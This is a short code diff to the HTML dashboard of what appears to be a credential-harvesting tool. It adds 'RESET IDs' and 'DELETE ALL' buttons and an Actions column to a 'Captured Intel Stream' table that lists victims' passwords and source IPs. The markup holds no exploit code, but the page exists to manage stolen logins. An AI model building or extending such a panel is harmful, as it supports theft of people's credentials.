@@ -118,7 +118,13 @@
         </div>
 
         <div class="data-table-panel">
-          <div class="panel-title" style="padding: 2rem 2rem 0 2rem;">Captured Intel Stream</div>
+          <div class="panel-title" style="padding: 2rem 2rem 0 2rem; display: flex; justify-content: space-between; align-items: center;">
+            Captured Intel Stream
+            <div style="display: flex; gap: 10px;">
+              <button class="btn btn-primary" onclick="resetIds()" style="padding: 0.5rem 1rem; font-size: 0.8rem;">RESET IDs</button>
+              <button class="btn btn-danger" onclick="deleteAllVictims()" style="padding: 0.5rem 1rem; font-size: 0.8rem;">DELETE ALL</button>
+            </div>
+          </div>
           <table>
             <thead>
               <tr>
@@ -128,11 +134,12 @@
                 <th>Password</th>
                 <th>Source IP</th>
                 <th>Captured At</th>
+                <th>Actions</th>
               </tr>
             </thead>
             <tbody id="victims-body">
               <tr>
-                <td colspan="6" style="text-align:center; padding: 5rem; color: var(--dim)">INITIALIZING SECURE LINK...
+                <td colspan="7" style="text-align:center; padding: 5rem; color: var(--dim)">INITIALIZING SECURE LINK...
                 </td>
               </tr>
             </tbody>
